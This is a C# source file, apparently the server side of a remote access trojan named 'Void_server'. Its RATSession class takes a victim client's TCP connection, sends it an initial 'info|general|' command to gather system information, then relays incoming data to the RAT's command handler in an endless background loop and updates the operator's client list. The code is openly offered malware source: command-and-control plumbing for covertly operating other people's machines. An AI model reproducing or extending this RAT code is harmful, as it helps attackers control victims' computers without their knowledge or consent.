using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Void_server.Controls;

namespace Void_server.Libs
{
    public class RATSession
    {
        public ClientBar bar { get; set; }
        public NetworkStream stream { get; set; }

        public void Start(TcpClient client)
        {
            stream = client.GetStream(); //get stream from client

            //get information from client
            SendCommand(Encoding.ASCII.GetBytes("info|general|"));
            FirstExecute(client);
            
            //start handling on a different thread
            Task.Run(() =>
            {
                while (true)
                    RAT.HandleInput(RAT.RecieveInformation(this), bar);
            });
        }

        public void Stop()
        {
            if (bar == null)
                return;

            stream.Close(); //close the stream

            //get the client bars alligned
            bar.Invoke(new Action(() =>
            {
                Panel clientPanel = (Panel)bar.Parent;
                clientPanel.Invoke(new Action(() => clientPanel.Controls.Remove(bar)));
                
                bar = null;
                MainForm.AllignClientBars(clientPanel);
            }));
        }

        public void SendCommand(byte[] bytes)
        {
            //attempt to write to the stream
            try
            {
                stream.Write(bytes, 0, bytes.Length);
            }
            catch (System.IO.IOException)
            {
                if (!ClientBar.SupressErrors)
                    MessageBox.Show("No connection, you can remove the client bar from right clicking on it and hit 'Remove'", "error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (Exception) { }
        }

        private async void FirstExecute(TcpClient client)
        {
            await Task.Run(() =>
            {
                string recieved = RAT.RecieveInformation(this);

                if (recieved == "failed")
                {
                    bar.Dispose();
                    return;
                }

                RAT.HandleInput(recieved, bar);
            });
        }
    }
}